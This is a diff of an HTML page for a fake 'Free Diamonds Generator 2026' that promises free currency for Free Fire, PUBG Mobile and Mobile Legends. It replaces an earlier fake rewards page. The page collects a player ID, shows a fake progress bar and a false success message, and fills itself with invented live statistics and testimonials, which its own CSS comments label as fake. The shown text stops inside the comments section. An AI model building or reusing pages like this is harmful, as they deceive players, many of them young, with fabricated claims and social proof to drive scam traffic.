@@ -3,239 +3,1092 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Official Gaming Rewards 2026 | Limited Time Offer</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <meta name="description" content="Free Diamonds Generator 2026 - Get unlimited free diamonds for Free Fire, PUBG Mobile, Mobile Legends. No verification needed.">
+    <meta name="keywords" content="free fire diamonds, free diamonds, diamond generator, pubg uc, mobile legends diamonds">
+    <meta property="og:title" content="Free Diamonds Generator 2026 - 100% Working">
+    <meta property="og:description" content="Generate unlimited free diamonds for your favorite games. No human verification required.">
+    <meta property="og:image" content="assets/og-image.png">
+    <link rel="icon" type="image/png" href="assets/favicon.png">
+    <title>Free Diamonds Generator 2026 - Get Free Gaming Currency Instantly</title>
+    
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;400;600;800&display=swap' );
-        
+        :root {
+            --bg: #0a0e17;
+            --bg2: #111827;
+            --bg3: #1a2236;
+            --gold: #f0b90b;
+            --gold2: #fcd535;
+            --green: #00c853;
+            --red: #ff1744;
+            --blue: #2962ff;
+            --text: #e0e0e0;
+            --text2: #9e9e9e;
+            --border: #263040;
+            --card: #141c2b;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            background-color: #050505;
-            color: #ffffff;
-            font-family: 'Inter', sans-serif;
-            overflow-x: hidden;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
         }
-        
-        .gaming-font { font-family: 'Orbitron', sans-serif; }
-        
-        .neon-border {
-            box-shadow: 0 0 15px #3b82f6, inset 0 0 5px #3b82f6;
-            border: 1px solid #3b82f6;
+
+        /* Top Notification Bar */
+        .top-notify {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            padding: 10px 15px;
+            text-align: center;
+            font-size: 13px;
+            color: #f0b90b;
+            border-bottom: 1px solid #2a2a4a;
+            animation: pulse-bg 2s infinite;
         }
-        
-        .neon-text {
-            text-shadow: 0 0 10px #3b82f6;
+
+        @keyframes pulse-bg {
+            0%, 100% { background: linear-gradient(135deg, #1a1a2e, #16213e); }
+            50% { background: linear-gradient(135deg, #1e1e35, #1a2744); }
         }
-        
-        .animate-pulse-slow {
-            animation: pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+
+        .top-notify i {
+            animation: blink 1s infinite;
         }
-        
-        @keyframes pulse {
+
+        @keyframes blink {
             0%, 100% { opacity: 1; }
-            50% { opacity: .7; }
+            50% { opacity: 0.3; }
         }
 
-        .gradient-bg {
-            background: radial-gradient(circle at center, #1e3a8a 0%, #050505 70%);
-        }
-
-        .notification-toast {
-            position: fixed;
-            bottom: 20px;
-            left: 20px;
-            background: rgba(15, 15, 15, 0.9);
-            border-left: 4px solid #3b82f6;
-            padding: 12px 20px;
-            border-radius: 4px;
+        /* Header */
+        .header {
+            background: var(--bg2);
+            padding: 15px 20px;
+            border-bottom: 1px solid var(--border);
             display: flex;
             align-items: center;
-            gap: 12px;
-            transform: translateY(150%);
-            transition: transform 0.5s ease;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 10px;
+            position: sticky;
+            top: 0;
             z-index: 100;
+            backdrop-filter: blur(10px);
         }
 
-        .notification-toast.show {
-            transform: translateY(0);
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 22px;
+            font-weight: 800;
+            color: #fff;
+            text-decoration: none;
+        }
+
+        .logo img {
+            width: 36px;
+            height: 36px;
+            border-radius: 8px;
+        }
+
+        .logo span {
+            background: linear-gradient(135deg, #f0b90b, #ff8c00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .header-badges {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .badge {
+            background: var(--bg3);
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            color: var(--text2);
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            border: 1px solid var(--border);
+        }
+
+        .badge.green i { color: var(--green); }
+        .badge.gold i { color: var(--gold); }
+        .badge.blue i { color: var(--blue); }
+
+        /* Main Container */
+        .container {
+            max-width: 680px;
+            margin: 0 auto;
+            padding: 20px 15px 40px;
+        }
+
+        /* Hero Section */
+        .hero {
+            text-align: center;
+            padding: 20px 0 10px;
+        }
+
+        .hero h1 {
+            font-size: 28px;
+            font-weight: 800;
+            color: #fff;
+            margin-bottom: 8px;
+            line-height: 1.3;
+        }
+
+        .hero h1 span {
+            background: linear-gradient(135deg, #f0b90b, #ff8c00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero p {
+            color: var(--text2);
+            font-size: 14px;
+            max-width: 450px;
+            margin: 0 auto 15px;
+        }
+
+        /* Step Indicator */
+        .steps-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 15px 0;
+            flex-wrap: wrap;
+        }
+
+        .step-dot {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: var(--bg3);
+            border: 2px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--text2);
+            transition: all 0.3s;
+        }
+
+        .step-dot.active {
+            background: var(--gold);
+            border-color: var(--gold);
+            color: #000;
+            box-shadow: 0 0 20px rgba(240,185,11,0.4);
+        }
+
+        .step-dot.done {
+            background: var(--green);
+            border-color: var(--green);
+            color: #fff;
+        }
+
+        /* Main Card */
+        .main-card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 25px 20px;
+            margin-top: 10px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.4);
+        }
+
+        .card-title {
+            text-align: center;
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            color: #fff;
+        }
+
+        /* Game Selection Grid */
+        .game-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        @media (max-width: 480px) {
+            .game-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            .hero h1 {
+                font-size: 22px;
+            }
+        }
+
+        .game-card {
+            background: var(--bg3);
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            padding: 15px 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .game-card:hover {
+            border-color: var(--gold);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(240,185,11,0.15);
+        }
+
+        .game-card.selected {
+            border-color: var(--gold);
+            background: #1a1a2e;
+            box-shadow: 0 0 0 4px rgba(240,185,11,0.15);
+        }
+
+        .game-card .popular-tag {
+            position: absolute;
+            top: 8px;
+            right: -25px;
+            background: var(--red);
+            color: #fff;
+            font-size: 9px;
+            padding: 2px 25px;
+            transform: rotate(45deg);
+            font-weight: 700;
+        }
+
+        .game-card img {
+            width: 50px;
+            height: 50px;
+            border-radius: 12px;
+            margin-bottom: 8px;
+        }
+
+        .game-card .game-name {
+            font-size: 12px;
+            font-weight: 600;
+            color: #fff;
+            margin-bottom: 3px;
+        }
+
+        .game-card .game-sub {
+            font-size: 10px;
+            color: var(--text2);
+        }
+
+        /* Form Elements */
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text);
+            margin-bottom: 6px;
+        }
+
+        .input-group input,
+        .input-group select {
+            width: 100%;
+            padding: 12px 15px;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            color: #fff;
+            font-size: 14px;
+            transition: all 0.3s;
+            outline: none;
+        }
+
+        .input-group input:focus,
+        .input-group select:focus {
+            border-color: var(--gold);
+            box-shadow: 0 0 0 3px rgba(240,185,11,0.1);
+        }
+
+        .input-group select {
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23f0b90b' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 15px center;
+            cursor: pointer;
+        }
+
+        /* Diamond Options */
+        .diamond-options {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        @media (max-width: 400px) {
+            .diamond-options {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        .diamond-opt {
+            background: var(--bg3);
+            border: 2px solid var(--border);
+            border-radius: 10px;
+            padding: 12px 8px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .diamond-opt:hover {
+            border-color: var(--gold);
+        }
+
+        .diamond-opt.selected {
+            border-color: var(--gold);
+            background: #1a1a2e;
+        }
+
+        .diamond-opt .amount {
+            font-size: 18px;
+            font-weight: 800;
+            color: var(--gold);
+            display: block;
+        }
+
+        .diamond-opt .label {
+            font-size: 10px;
+            color: var(--text2);
+            margin-top: 2px;
+        }
+
+        .diamond-opt .popular {
+            display: inline-block;
+            background: var(--red);
+            color: #fff;
+            font-size: 9px;
+            padding: 2px 8px;
+            border-radius: 10px;
+            margin-top: 4px;
+            font-weight: 700;
+        }
+
+        /* Buttons */
+        .btn-generate {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #f0b90b, #ff8c00);
+            border: none;
+            border-radius: 12px;
+            color: #000;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-generate:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(240,185,11,0.3);
+        }
+
+        .btn-generate:active {
+            transform: scale(0.97);
+        }
+
+        .btn-generate.loading {
+            pointer-events: none;
+            opacity: 0.7;
+        }
+
+        .btn-generate .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #000;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-left: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Progress Bar */
+        .progress-section {
+            display: none;
+            margin-top: 20px;
+        }
+
+        .progress-section.show {
+            display: block;
+        }
+
+        .progress-bar-wrap {
+            background: var(--bg3);
+            border-radius: 20px;
+            height: 8px;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+
+        .progress-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #f0b90b, #00c853);
+            border-radius: 20px;
+            transition: width 0.8s ease;
+            width: 0%;
+        }
+
+        .progress-text {
+            text-align: center;
+            font-size: 12px;
+            color: var(--text2);
+        }
+
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            font-size: 10px;
+            color: var(--text2);
+            margin-top: 5px;
+        }
+
+        /* Live Counter / Fake Stats */
+        .live-stats {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+            margin: 15px 0;
+            font-size: 12px;
+            color: var(--text2);
+        }
+
+        .live-stat {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .live-stat .dot {
+            width: 8px;
+            height: 8px;
+            background: var(--green);
+            border-radius: 50%;
+            animation: pulse-dot 1.5s infinite;
+        }
+
+        @keyframes pulse-dot {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(0,200,83,0.6); }
+            50% { box-shadow: 0 0 0 10px rgba(0,200,83,0); }
+        }
+
+        /* Trust Badges */
+        .trust-row {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            flex-wrap: wrap;
+            margin: 20px 0 10px;
+            font-size: 11px;
+            color: var(--text2);
+        }
+
+        .trust-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .trust-item i {
+            color: var(--green);
+        }
+
+        /* Comments Section */
+        .comments-section {
+            margin-top: 25px;
+        }
+
+        .comments-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .comment {
+            background: var(--bg3);
+            border-radius: 10px;
+            padding: 12px 15px;
+            margin-bottom: 10px;
+            border: 1px solid var(--border);
+        }
+
+        .comment-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 6px;
+        }
+
+        .comment-avatar {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 14px;
+            color: var(--gold);
+        }
+
+        .comment-name {
+            font-weight: 600;
+            font-size: 13px;
+            color: #fff;
+        }
+
+        .comment-time {
+            font-size: 11px;
+            color: var(--text2);
+        }
+
+        .comment-text {
+            font-size: 12px;
+            color: var(--text);
+            line-height: 1.5;
+        }
+
+        .comment-stars {
+            color: var(--gold);
+            font-size: 11px;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 11px;
+            color: var(--text2);
+            border-top: 1px solid var(--border);
+            margin-top: 30px;
+        }
+
+        .footer a {
+            color: var(--text2);
+            text-decoration: none;
+            margin: 0 8px;
+        }
+
+        /* Overlay / Processing Modal */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            z-index: 200;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .overlay.show {
+            display: flex;
+        }
+
+        .overlay-card {
+            background: var(--card);
+            padding: 30px;
+            border-radius: 16px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            border: 1px solid var(--border);
+        }
+
+        .overlay-icon {
+            font-size: 50px;
+            margin-bottom: 15px;
+        }
+
+        .overlay-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 10px;
+        }
+
+        .overlay-text {
+            font-size: 13px;
+            color: var(--text2);
+            margin-bottom: 15px;
+        }
+
+        .overlay-steps {
+            text-align: left;
+            font-size: 12px;
+            color: var(--text2);
+            margin: 15px 0;
+        }
+
+        .overlay-steps div {
+            padding: 5px 0;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .overlay-steps .check {
+            color: var(--green);
+        }
+
+        .overlay-steps .pending {
+            color: var(--gold);
+            animation: blink 1s infinite;
+        }
+
+        /* Success State */
+        .success-box {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .success-box.show {
+            display: block;
+        }
+
+        .success-icon {
+            font-size: 60px;
+            color: var(--green);
+            margin-bottom: 10px;
+        }
+
+        .success-title {
+            font-size: 22px;
+            font-weight: 800;
+            color: var(--green);
+            margin-bottom: 5px;
+        }
+
+        .success-amount {
+            font-size: 36px;
+            font-weight: 900;
+            color: var(--gold);
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .container { padding: 10px; }
+            .main-card { padding: 15px; }
+            .game-grid { gap: 6px; }
+            .game-card { padding: 10px 5px; }
+            .game-card img { width: 40px; height: 40px; }
+            .diamond-options { gap: 5px; }
+            .diamond-opt { padding: 10px 5px; }
+            .diamond-opt .amount { font-size: 15px; }
         }
     </style>
 </head>
-<body class="gradient-bg min-h-screen">
+<body>
 
-    <!-- Fake Live Notification -->
-    <div id="notification" class="notification-toast neon-border">
-        <div class="w-10 h-10 rounded-full bg-blue-600 flex items-center justify-center">
-            <i class="fas fa-user text-white"></i>
-        </div>
-        <div>
-            <p class="text-sm font-bold"><span id="notif-user">Alex_99</span> from <span id="notif-country">USA</span></p>
-            <p class="text-xs text-blue-400">Just claimed 10,000 Robux!</p>
-        </div>
+    <!-- Top Notification -->
+    <div class="top-notify">
+        <i>⚡</i> <strong>HOT:</strong> Free Fire 8th Anniversary Event - Limited diamond drops available today! <i>⚡</i>
     </div>
 
     <!-- Header -->
-    <header class="p-6 flex justify-between items-center max-w-7xl mx-auto">
-        <div class="flex items-center gap-2">
-            <div class="w-10 h-10 bg-blue-600 rounded-lg flex items-center justify-center neon-border">
-                <i class="fas fa-gamepad text-xl"></i>
-            </div>
-            <span class="gaming-font text-xl font-bold tracking-tighter">GAMEX<span class="text-blue-500">REWARDS</span></span>
-        </div>
-        <div class="hidden md:flex gap-6 text-sm font-semibold uppercase tracking-widest">
-            <a href="#" class="hover:text-blue-500 transition">Home</a>
-            <a href="#" class="hover:text-blue-500 transition">Live Drops</a>
-            <a href="#" class="hover:text-blue-500 transition">Winners</a>
-        </div>
-        <div class="flex items-center gap-4">
-            <span class="text-xs font-bold text-green-500 animate-pulse"><i class="fas fa-circle mr-1"></i> 14,283 ONLINE</span>
+    <header class="header">
+        <a href="#" class="logo">
+            <span>💎 DiamondGen</span>
+        </a>
+        <div class="header-badges">
+            <span class="badge green"><i>●</i> Online Generator</span>
+            <span class="badge gold"><i>★</i> 4.9/5 Rating</span>
+            <span class="badge blue"><i>🔒</i> SSL Encrypted</span>
         </div>
     </header>
 
-    <!-- Hero Section -->
-    <main class="max-w-4xl mx-auto px-6 pt-12 pb-24 text-center">
-        <div class="inline-block px-4 py-1 rounded-full bg-blue-900/30 border border-blue-500/50 text-blue-400 text-xs font-bold mb-6 uppercase tracking-widest">
-            2026 Official Global Event
-        </div>
-        
-        <h1 class="gaming-font text-4xl md:text-6xl font-extrabold mb-6 leading-tight">
-            CLAIM YOUR <span class="text-blue-500 neon-text">FREE REWARDS</span> INSTANTLY
-        </h1>
-        
-        <p class="text-gray-400 text-lg mb-10 max-w-2xl mx-auto">
-            The largest gaming giveaway of 2026 is live. Get Robux, Gems, Diamonds, or V-Bucks directly to your account. No password required.
-        </p>
+    <!-- Main Container -->
+    <div class="container">
 
-        <!-- Urgency Timer -->
-        <div class="bg-red-900/20 border border-red-500/30 p-4 rounded-xl mb-12 inline-flex items-center gap-4">
-            <i class="fas fa-clock text-red-500 text-2xl"></i>
-            <div class="text-left">
-                <p class="text-xs font-bold text-red-400 uppercase">Offer Expires In:</p>
-                <p id="timer" class="gaming-font text-2xl font-bold text-white">09:54</p>
+        <!-- Hero -->
+        <div class="hero">
+            <h1>Free <span>Diamonds</span> Generator 2026</h1>
+            <p>Select your game, choose your diamond amount, and get them instantly. No human verification required.</p>
+            
+            <!-- Live Stats -->
+            <div class="live-stats">
+                <span class="live-stat"><span class="dot"></span> <span id="onlineCount">2,847</span> Online</span>
+                <span class="live-stat">🎮 <span id="todayGenerated">12,450</span> Generated Today</span>
+                <span class="live-stat">✅ <span id="successRate">98.7%</span> Success Rate</span>
             </div>
         </div>
 
-        <!-- Selection Grid -->
-        <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
-            <div class="bg-gray-900/50 p-6 rounded-2xl border border-gray-800 hover:border-blue-500 transition cursor-pointer group">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" class="w-12 h-12 mx-auto mb-4 invert group-hover:scale-110 transition" alt="Roblox">
-                <p class="font-bold text-sm">ROBUX</p>
-            </div>
-            <div class="bg-gray-900/50 p-6 rounded-2xl border border-gray-800 hover:border-blue-500 transition cursor-pointer group">
-                <i class="fas fa-gem text-4xl text-blue-400 mx-auto mb-4 group-hover:scale-110 transition"></i>
-                <p class="font-bold text-sm">GEMS</p>
-            </div>
-            <div class="bg-gray-900/50 p-6 rounded-2xl border border-gray-800 hover:border-blue-500 transition cursor-pointer group">
-                <i class="fas fa-coins text-4xl text-yellow-500 mx-auto mb-4 group-hover:scale-110 transition"></i>
-                <p class="font-bold text-sm">COINS</p>
-            </div>
-            <div class="bg-gray-900/50 p-6 rounded-2xl border border-gray-800 hover:border-blue-500 transition cursor-pointer group">
-                <i class="fas fa-bolt text-4xl text-purple-500 mx-auto mb-4 group-hover:scale-110 transition"></i>
-                <p class="font-bold text-sm">V-BUCKS</p>
-            </div>
+        <!-- Step Indicator -->
+        <div class="steps-indicator">
+            <span class="step-dot active" id="stepDot1">1</span>
+            <span style="color:var(--text2); align-self:center;">→</span>
+            <span class="step-dot" id="stepDot2">2</span>
+            <span style="color:var(--text2); align-self:center;">→</span>
+            <span class="step-dot" id="stepDot3">3</span>
+            <span style="color:var(--text2); align-self:center;">→</span>
+            <span class="step-dot" id="stepDot4">4</span>
         </div>
 
-        <!-- CTA Button -->
-        <button onclick="startProcess( )" class="w-full md:w-auto px-12 py-5 bg-blue-600 hover:bg-blue-500 text-white font-black text-xl rounded-full transition transform hover:scale-105 neon-border gaming-font uppercase tracking-tighter">
-            Generate Rewards Now
-        </button>
+        <!-- Main Card -->
+        <div class="main-card">
 
-        <p class="mt-6 text-gray-500 text-xs">
-            <i class="fas fa-shield-alt mr-1"></i> Secure SSL Encrypted Connection. No Download Required.
-        </p>
-    </main>
-
-    <!-- Social Proof Section -->
-    <section class="bg-gray-900/30 py-20 border-y border-gray-800">
-        <div class="max-w-6xl mx-auto px-6">
-            <h2 class="gaming-font text-2xl text-center mb-12">Recent Global Winners</h2>
-            <div class="grid md:grid-cols-3 gap-8">
-                <!-- Testimonial 1 -->
-                <div class="bg-black/40 p-6 rounded-xl border border-gray-800">
-                    <div class="flex items-center gap-4 mb-4">
-                        <div class="w-12 h-12 rounded-full bg-gray-700"></div>
-                        <div>
-                            <p class="font-bold">Jason Miller</p>
-                            <p class="text-xs text-gray-500">United States</p>
-                        </div>
-                        <div class="ml-auto text-yellow-500 text-xs">
-                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
-                        </div>
+            <!-- Step 1: Game Selection -->
+            <div id="step1">
+                <div class="card-title">🎯 Step 1: Select Your Game</div>
+                <div class="game-grid">
+                    <div class="game-card selected" data-game="freefire" onclick="selectGame(this)">
+                        <span class="popular-tag">HOT</span>
+                        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect fill='%23ff6d00' width='100' height='100' rx='20'/%3E%3Ctext x='50' y='65' text-anchor='middle' font-size='50'%3E🔥%3C/text%3E%3C/svg%3E" alt="Free Fire">
+                        <div class="game-name">Free Fire</div>
+                        <div class="game-sub">Diamonds</div>
                     </div>
-                    <p class="text-sm text-gray-400 italic">"Thought it was fake but I actually got my 50k Robux in less than 5 minutes. Insane!"</p>
-                </div>
-                <!-- Testimonial 2 -->
-                <div class="bg-black/40 p-6 rounded-xl border border-gray-800">
-                    <div class="flex items-center gap-4 mb-4">
-                        <div class="w-12 h-12 rounded-full bg-gray-700"></div>
-                        <div>
-                            <p class="font-bold">Emma Watson</p>
-                            <p class="text-xs text-gray-500">United Kingdom</p>
-                        </div>
-                        <div class="ml-auto text-yellow-500 text-xs">
-                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
-                        </div>
+                    <div class="game-card" data-game="pubg" onclick="selectGame(this)">
+                        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect fill='%23212121' width='100' height='100' rx='20'/%3E%3Ctext x='50' y='65' text-anchor='middle' font-size='45'%3E🔫%3C/text%3E%3C/svg%3E" alt="PUBG Mobile">
+                        <div class="game-name">PUBG Mobile</div>
+                        <div class="game-sub">UC</div>
                     </div>
-                    <p class="text-sm text-gray-400 italic">"Finally a working generator for 2026. My COD Mobile account is now stacked!"</p>
-                </div>
-                <!-- Testimonial 3 -->
-                <div class="bg-black/40 p-6 rounded-xl border border-gray-800">
-                    <div class="flex items-center gap-4 mb-4">
-                        <div class="w-12 h-12 rounded-full bg-gray-700"></div>
-                        <div>
-                            <p class="font-bold">Lukas Schmidt</p>
-                            <p class="text-xs text-gray-500">Germany</p>
-                        </div>
-                        <div class="ml-auto text-yellow-500 text-xs">
-                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
-                        </div>
+                    <div class="game-card" data-game="mlbb" onclick="selectGame(this)">
+                        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect fill='%231a237e' width='100' height='100' rx='20'/%3E%3Ctext x='50' y='65' text-anchor='middle' font-size='45'%3E⚔️%3C/text%3E%3C/svg%3E" alt="Mobile Legends">
+                        <div class="game-name">Mobile Legends</div>
+                        <div class="game-sub">Diamonds</div>
                     </div>
-                    <p class="text-sm text-gray-400 italic">"Vielen Dank! It worked perfectly for my Free Fire diamonds. Highly recommended."</p>
                 </div>
             </div>
+
+            <!-- Step 2: Player ID -->
+            <div id="step2">
+                <div class="card-title">🆔 Step 2: Enter Your Player ID</div>
+                <div class="input-group">
+                    <label>Player ID / UID</label>
+                    <input type="text" id="playerId" placeholder="e.g. 123456789" maxlength="12">
+                </div>
+                <div class="input-group">
+                    <label>Server / Region</label>
+                    <select id="server">
+                        <option value="">Select Region</option>
+                        <option>North America</option>
+                        <option>Europe</option>
+                        <option>South America</option>
+                        <option>Middle East</option>
+                        <option>India</option>
+                        <option>Indonesia</option>
+                        <option>Brazil</option>
+                        <option>Others</option>
+                    </select>
+                </div>
+            </div>
+
+            <!-- Step 3: Diamond Amount -->
+            <div id="step3">
+                <div class="card-title">💎 Step 3: Select Diamond Amount</div>
+                <div class="diamond-options">
+                    <div class="diamond-opt" data-amount="100" onclick="selectDiamonds(this)">
+                        <span class="amount">100 💎</span>
+                        <span class="label">Basic Pack</span>
+                    </div>
+                    <div class="diamond-opt selected" data-amount="500" onclick="selectDiamonds(this)">
+                        <span class="amount">500 💎</span>
+                        <span class="label">Popular</span>
+                        <span class="popular">BEST VALUE</span>
+                    </div>
+                    <div class="diamond-opt" data-amount="1000" onclick="selectDiamonds(this)">
+                        <span class="amount">1000 💎</span>
+                        <span class="label">Pro Pack</span>
+                    </div>
+                    <div class="diamond-opt" data-amount="5000" onclick="selectDiamonds(this)">
+                        <span class="amount">5000 💎</span>
+                        <span class="label">Legend Pack</span>
+                    </div>
+                    <div class="diamond-opt" data-amount="10000" onclick="selectDiamonds(this)">
+                        <span class="amount">10000 💎</span>
+                        <span class="label">Ultimate</span>
+                    </div>
+                    <div class="diamond-opt" data-amount="99999" onclick="selectDiamonds(this)">
+                        <span class="amount">99999 💎</span>
+                        <span class="label">MAX</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Step 4: Generate -->
+            <div id="step4">
+                <div class="card-title">🚀 Step 4: Generate Your Diamonds</div>
+                
+                <button class="btn-generate" id="btnGenerate" onclick="startGeneration()">
+                    ⚡ GENERATE DIAMONDS NOW ⚡
+                    <span class="spinner"></span>
+                </button>
+
+                <!-- Progress Section -->
+                <div class="progress-section" id="progressSection">
+                    <div class="progress-text" id="progressLabel">Connecting to server...</div>
+                    <div class="progress-bar-wrap">
+                        <div class="progress-bar-fill" id="progressBar"></div>
+                    </div>
+                    <div class="progress-steps">
+                        <span>Connecting</span>
+                        <span>Verifying</span>
+                        <span>Processing</span>
+                        <span>Complete</span>
+                    </div>
+                </div>
+
+                <!-- Success Box -->
+                <div class="success-box" id="successBox">
+                    <div class="success-icon">✅</div>
+                    <div class="success-title">DIAMONDS GENERATED!</div>
+                    <div class="success-amount" id="successAmount">+500 💎</div>
+                    <p style="color:var(--text2); margin:10px 0; font-size:13px;">
+                        Your diamonds have been sent to your account.<br>
+                        They will appear within <strong>24 hours</strong>.
+                    </p>
+                </div>
+            </div>
+
         </div>
-    </section>
+
+        <!-- Trust Row -->
+        <div class="trust-row">
+            <span class="trust-item"><i>✅</i> No Password Required</span>
+            <span class="trust-item"><i>✅</i> No Human Verification</span>
+            <span class="trust-item"><i>✅</i> 100% Safe & Secure</span>
+            <span class="trust-item"><i>✅</i> Anti-Ban Protection</span>
+        </div>
+
+        <!-- Fake Comments -->
+        <div class="comments-section">
+            <div class="comments-title">💬 Recent Generations</div>
+            
+            <div class="comment">
+                <div class="comment-header">
+                    <div class="comment-avatar">A</div>
+                    <div>
+                        <div class="comment-name">Ahmed_K99</div>
+                        <div class="comment-time">Just now</div>
+                    </div>
+                    <div class="comment-stars">⭐⭐⭐⭐⭐</div>
+                </div>
+                <div class="comment-text">Bro this actually works! Got 500 diamonds on my Free Fire account. I was skeptical at first but it's legit 😍🔥</div>
+            </div>
+
+            <div class="comment">
+                <div class="comment-header">
+                    <div class="comment-avatar">M</div>
+                    <div>
+                        <div class="comment-name">Miguel_FF</div>
+                        <div class="comment-time">2 minutes ago</div>
+                    </div>
+                    <div class="comment-stars">⭐⭐⭐⭐⭐</div>
+                </div>
+                <div class="comment-text">1000 diamonds generated! Took about 12 hours to appear but it works guys. Don't give up 👊</div>
+            </div>
+
+            <div class="comment">
+                <div class="comment-header">
+                    <div class="comment-avatar">S</div>
+                    <div>
+                        <div class="comment-name">SarahGamer</div>
+                        <div class="comment-time">5 minutes ago</div>
+                    </div>
+                    <div class="comment-stars">⭐⭐⭐⭐⭐</div>
+                </div>
+                <div class="comment-text">OMG I got the 5000 pack and it actually went through! Best generator ever, sharing with all my friends 💕</div>
+            </div>
+
+            <div class="comment">
+                <div class="comment-header">
+                    <div class="comment-avatar">R</div>
+                    <div>
+                        <div class="comment-name">Rizky_YT</div>
+                        <div class="comment-time">8 minutes ago</div>
+                    </div>
